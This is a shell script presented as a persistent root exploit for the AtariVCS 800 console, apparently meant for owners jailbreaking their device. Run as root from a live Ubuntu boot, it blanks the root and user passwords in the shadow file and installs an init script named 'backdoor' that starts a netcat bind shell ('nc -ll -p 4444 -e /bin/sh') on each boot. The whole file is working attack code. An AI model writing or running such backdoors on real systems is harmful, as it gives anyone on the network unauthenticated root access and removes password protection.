#!/bin/sh
#
# AtariVCS 800 persistent root exploit
# by hostile of ArcadeHustle
# 7/4/2021
#
# Usage:
# https://atarivcs.com/content/Linux-Install-Guide.pdf
# Boot Ubuntu live image, "Tru Ubuntu"
# Launch Terminal, use wget to download atarivcs.sh
# chmod +x, and ./atarivcs.sh as root
# Reboot, enjoy tty2 login as either root, or user
# Enjoy root shell on port 4444

mkdir /tmp/TakeRoot
mount /dev/mmcblk0p4 /tmp/TakeRoot
cd /tmp/TakeRoot/lib/overlays/etc/upper/
echo root::18709:0:99999:7::: > shadow
echo user::18709:0:99999:7::: >> shadow
mkdir init.d
cat << EOF > init.d/backdoor
#! /bin/sh
. /lib/lsb/init-functions

set -e

case "\$1" in
  start)
        busybox nc -ll -p 4444 -e /bin/sh &
        ;;
  stop|reload|restart|force-reload|status)
        ;;
  *)
        echo "Usage: backdoor {start|stop|restart|force-reload|status}" >&2
        exit 1
        ;;
esac

exit 0
EOF
chmod +x init.d/backdoor
mkdir rc3.d
mkdir rc4.d
mkdir rc5.d
cd rc3.d
ln -s ../init.d/backdoor S99backdoor
cd ..
cd rc4.d
ln -s ../init.d/backdoor S99backdoor
cd ..
cd rc5.d
ln -s ../init.d/backdoor S99backdoor
cd ..
